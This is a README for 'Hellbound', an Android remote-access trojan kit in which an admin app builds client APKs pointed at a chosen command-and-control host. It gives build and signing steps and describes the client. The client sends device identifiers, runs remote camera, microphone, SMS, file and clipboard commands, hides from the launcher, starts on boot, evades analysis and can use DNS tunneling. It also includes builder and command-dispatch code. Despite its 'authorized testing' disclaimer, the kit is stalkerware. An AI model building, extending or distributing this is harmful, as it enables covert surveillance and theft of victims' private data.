# Hellbound Admin + Client System

A mobile-only Android system consisting of an Admin APK with GUI panel and integrated builder for generating client RAT APKs with injected settings. Works fully offline or with optional Firebase/DNS/WebSocket backend.

## 🚀 Quick Start

### Prerequisites

- **Android Studio** (Latest version recommended)
- **Node.js** (v16 or higher)
- **Java Development Kit (JDK)** 8 or 11
- **Android SDK** (API level 21+)
- **React Native CLI** (`npm install -g @react-native-community/cli`)

### System Requirements

- **Target Platform:** Android Only
- **Minimum Android Version:** API 21 (Android 5.0)
- **Development OS:** Windows, macOS, or Linux

## 📁 Project Structure

```
hellbound_system/
├── admin_apk/                 # Admin APK source code
│   ├── HellboundAdmin/        # React Native project
│   ├── android/               # Android-specific code
│   ├── src/                   # React Native components
│   └── native_modules/        # Java native modules
├── client_apk/                # Client APK source code
│   ├── app/                   # Main Android app
│   ├── src/main/java/         # Java source files
│   └── assets/                # Configuration files
├── keystore/                  # APK signing certificates
├── templates/                 # Client template APK
└── docs/                      # Documentation
```

## 🔧 Compilation Steps

### Step 1: Environment Setup

1. **Install Android Studio:**
   ```bash
   # Download from: https://developer.android.com/studio
   # Install Android SDK, Build Tools, and Platform Tools
   ```

2. **Set Environment Variables:**
   ```bash
   export ANDROID_HOME=$HOME/Android/Sdk
   export PATH=$PATH:$ANDROID_HOME/emulator
   export PATH=$PATH:$ANDROID_HOME/tools
   export PATH=$PATH:$ANDROID_HOME/tools/bin
   export PATH=$PATH:$ANDROID_HOME/platform-tools
   ```

3. **Install Node.js Dependencies:**
   ```bash
   npm install -g @react-native-community/cli
   npm install -g react-native
   ```

### Step 2: Clone and Setup Project

```bash
# Clone the repository
git clone <repository-url>
cd hellbound_system

# Install Admin APK dependencies
cd admin_apk/HellboundAdmin
npm install

# Install required React Native packages
npm install @react-native-async-storage/async-storage
npm install react-native-fs
npm install react-native-share
npm install react-native-vector-icons
npm install react-navigation
```

### Step 3: Build Admin APK

```bash
# Navigate to Admin APK directory
cd admin_apk/HellboundAdmin

# For Debug Build
npx react-native run-android

# For Release Build
cd android
./gradlew assembleRelease

# APK will be generated at:
# android/app/build/outputs/apk/release/app-release.apk
```

### Step 4: Build Client Template APK

```bash
# Navigate to Client APK directory
cd client_apk

# Build debug version
./gradlew assembleDebug

# Build release version
./gradlew assembleRelease

# Template APK will be generated at:
# app/build/outputs/apk/release/app-release.apk
```

### Step 5: Generate Keystore (First Time Only)

```bash
# Create keystore directory
mkdir -p keystore

# Generate keystore for APK signing
keytool -genkey -v -keystore keystore/hellbound.keystore -alias hellbound -keyalg RSA -keysize 2048 -validity 10000

# Remember the passwords - you'll need them for signing
```

## 🛠️ Development Workflow

### Admin APK Development

1. **Start Metro Bundler:**
   ```bash
   cd admin_apk/HellboundAdmin
   npx react-native start
   ```

2. **Run on Device/Emulator:**
   ```bash
   npx react-native run-android
   ```

3. **Debug Mode:**
   ```bash
   # Enable debug mode
   adb shell input keyevent 82
   # Select "Debug JS Remotely"
   ```

### Client APK Development

1. **Open in Android Studio:**
   ```bash
   # Open client_apk folder in Android Studio
   # Build -> Make Project
   ```

2. **Test on Device:**
   ```bash
   # Connect Android device with USB debugging enabled
   adb install app/build/outputs/apk/debug/app-debug.apk
   ```

## 📱 Usage Instructions

### Admin APK Usage

1. **Install Admin APK** on your Android device
2. **Open Hellbound Admin** app
3. **Enter Target Configuration:**
   - Host/IP address
   - Port number
   - Communication method (HTTP/WebSocket/DNS/Firebase)
4. **Generate Client APK:**
   - Tap "Build Client APK"
   - Wait for injection and signing process
5. **Deploy Client APK:**
   - Share via QR code, email, or direct install
   - Monitor connected clients in dashboard

### Client APK Behavior

- **Auto-connects** to configured host:port
- **Sends device metadata** (IMEI, IP, battery, etc.)
- **Executes remote commands** (file list, camera, mic, SMS, clipboard)
- **Auto-starts on boot** (optional)
- **Hides from launcher** (optional)
- **Stealth operation** with customizable icon/name

## 🔐 Security Features

### Admin APK Security
- Embedded keystore for APK signing
- Code obfuscation with ProGuard/R8
- Encrypted configuration storage
- Secure communication protocols

### Client APK Stealth
- Dynamic icon and app name changing
- Hide from Android launcher
- Anti-sleep foreground service
- Code obfuscation and string encryption
- Anti-debugging and anti-analysis measures

## 🌐 Communication Protocols

### Supported Channels
1. **HTTP/HTTPS** - Standard web communication
2. **WebSocket** - Real-time bidirectional communication
3. **DNS Tunneling** - Stealth communication via DNS queries
4. **Firebase** - Cloud-based messaging and data sync

### Command Structure
```json
{
  "command": "file_list",
  "parameters": {
    "path": "/sdcard/",
    "recursive": true
  },
  "timestamp": 1640995200,
  "client_id": "device_unique_id"
}
```

## 🔧 Troubleshooting

### Common Build Issues

1. **React Native Build Fails:**
   ```bash
   # Clean and rebuild
   cd admin_apk/HellboundAdmin
   npx react-native clean
   cd android && ./gradlew clean
   cd .. && npx react-native run-android
   ```

2. **Android SDK Issues:**
   ```bash
   # Update SDK components
   sdkmanager --update
   sdkmanager "platforms;android-30" "build-tools;30.0.3"
   ```

3. **Keystore Problems:**
   ```bash
   # Verify keystore
   keytool -list -v -keystore keystore/hellbound.keystore
   ```

### Runtime Issues

1. **Client Connection Failed:**
   - Check network connectivity
   - Verify host/port configuration
   - Ensure firewall allows connections

2. **Permissions Denied:**
   - Grant required permissions manually
   - Check Android version compatibility
   - Verify app is not in battery optimization

## 📋 Build Configurations

### Debug Configuration
```gradle
android {
    buildTypes {
        debug {
            debuggable true
            minifyEnabled false
            applicationIdSuffix ".debug"
        }
    }
}
```

### Release Configuration
```gradle
android {
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
    }
}
```

## 🚀 Advanced Features

### Custom Client Templates
1. Create custom `client_template.apk`
2. Place in `templates/` directory
3. Configure injection points in `config.json`

### Backend Integration
1. **Firebase Setup:**
   - Create Firebase project
   - Add `google-services.json` to both APKs
   - Configure FCM for push notifications

2. **DNS Tunneling:**
   - Set up DNS server with custom records
   - Configure client for DNS-based C2

### QR Code Deployment
- Generate QR codes for easy client APK distribution
- Include download links and installation instructions

## 📚 API Documentation

### Admin APK Native Modules

```javascript
// APK Builder Module
import { APKBuilder } from './native_modules/APKBuilder';

const buildClient = async (config) => {
  const result = await APKBuilder.injectAndSign({
    templatePath: '/path/to/template.apk',
    outputPath: '/path/to/client.apk',
    config: {
      host: '192.168.1.100',
      port: 8080,
      protocol: 'http'
    }
  });
  return result;
};
```

### Client APK Command Interface

```java
// Command Executor
public class CommandExecutor {
    public void executeCommand(String jsonCommand) {
        JSONObject cmd = new JSONObject(jsonCommand);
        String action = cmd.getString("command");
        
        switch(action) {
            case "file_list":
                handleFileList(cmd);
                break;
            case "camera_capture":
                handleCameraCapture(cmd);
                break;
            // ... other commands
        }
    }
}
```

## 🔄 Update Process

### Admin APK Updates
1. Build new version with incremented version code
2. Sign with same keystore
3. Install over existing version

### Client APK Updates
1. Generate new client template
2. Redistribute via Admin APK
3. Auto-update mechanism (optional)

## 📄 License

This project is for educational and authorized testing purposes only. Users are responsible for compliance with applicable laws and regulations.

## 🤝 Contributing

1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

## 📞 Support

For issues and questions:
- Create GitHub issue
- Check troubleshooting section
- Review documentation

---

**⚠️ Important Notice:** This system is designed for authorized security testing and educational purposes only. Ensure you have proper authorization before deploying on any devices. Misuse of this software may violate local laws and regulations.
